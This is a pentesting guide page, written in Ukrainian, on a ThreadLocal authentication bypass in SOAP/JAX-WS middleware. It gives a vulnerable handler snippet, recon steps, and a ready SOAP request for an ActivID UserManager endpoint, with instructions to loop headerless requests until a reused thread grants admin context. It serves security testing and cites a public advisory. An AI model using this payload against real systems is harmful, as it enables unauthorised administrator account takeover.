# SOAP/JAX-WS ThreadLocal Authentication Bypass

{{#include ../banners/hacktricks-training.md}}

## Коротко

- Деякі middleware-ланцюги зберігають автентифікований `Subject`/`Principal` в статичному `ThreadLocal` і оновлюють його лише коли надходить пропрієтарний SOAP-заголовок.
- Оскільки WebLogic/JBoss/GlassFish рециркулюють робочі потоки, відсутність цього заголовка призводить до того, що останній привілейований `Subject`, оброблений потоком, тихо повторно використовується.
- Атакуйте вразливий endpoint без заголовків, але з правильно сформованими SOAP-телами, поки повторно використаний потік не надасть вам вкрадений контекст адміністратора.

## Причина

Обробники, подібні до наведених нижче, перезаписують ідентичність, що зберігається в `ThreadLocal`, тільки коли присутній кастомний заголовок, тому контекст попереднього запиту зберігається:
```java
public boolean handleMessage(SOAPMessageContext ctx) {
if (!outbound) {
SOAPHeader hdr = ctx.getMessage().getSOAPPart().getEnvelope().getHeader();
SOAPHeaderElement e = findHeader(hdr, subjectName);
if (e != null) {
SubjectHolder.setSubject(unmarshal(e));
}
}
return true;
}
```
## Recon

1. Перерахуйте правила reverse proxy / маршрутизації, щоб знайти приховані SOAP дерева, які можуть блокувати `?wsdl`, але приймати POST-запити (відобразіть їх поряд із потоком у [80,443 - Pentesting Web Methodology](../network-services-pentesting/pentesting-web/README.md)).
2. Розпакуйте артефакти EAR/WAR/EJB (`unzip *.ear`) і перегляньте `application.xml`, `web.xml`, анотації `@WebService` та handler chains (наприклад, `LoginHandlerChain.xml`), щоб виявити handler class, SOAP header QName і назви backing EJB.
3. Якщо метадані відсутні, brute-force ймовірні шляхи `ServiceName?wsdl` або тимчасово послабте лабораторні проксі, потім імпортуйте будь-який відновлений WSDL у інструменти на кшталт [Burp Suite Wsdler](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f) для генерації базових envelopes.
4. Перегляньте джерела handler-ів на наявність `ThreadLocal` keepers (наприклад, `SubjectHolder.setSubject()`), які ніколи не очищуються, коли authentication header відсутній або неправильно сформований.

## Exploitation

1. Надішліть дійсний запит **with** пропрієтарним заголовком, щоб з'ясувати стандартні коди відповіді та будь-які помилки, що використовуються для invalid tokens.
2. Повторно надішліть те саме SOAP body, опустивши заголовок. Тримайте XML well-formed і дотримуйтесь required namespaces, щоб handler завершився чисто.
3. Запустіть запит у циклі; коли він потрапить на потік, який раніше виконав привілейовану дію, повторно використаний `Subject` розблокує захищені операції, такі як user або credential managers.
```http
POST /ac-iasp-backend-jaxws/UserManager HTTP/1.1
Host: target
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:jax="http://jaxws.user.frontend.iasp.service.actividentity.com">
<soapenv:Header/>
<soapenv:Body>
<jax:findUserIds>
<arg0></arg0>
<arg1>spl*</arg1>
</jax:findUserIds>
</soapenv:Body>
</soapenv:Envelope>
```
## Перевірка вразливості

- Підключіть JDWP (`-agentlib:jdwp=transport=dt_socket,server=y,address=5005,suspend=n`) або подібні засоби налагодження, щоб спостерігати за вмістом `ThreadLocal` до і після кожного виклику, підтверджуючи, що неаутентифікований запит успадкував попередній Subject адміністратора.

## Джерела

- [Synacktiv – ActivID administrator account takeover: the story behind HID-PSA-2025-002](https://www.synacktiv.com/publications/activid-administrator-account-takeover-the-story-behind-hid-psa-2025-002.html)
- [PortSwigger – Wsdler (WSDL parser) extension](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f)

{{#include ../banners/hacktricks-training.md}}
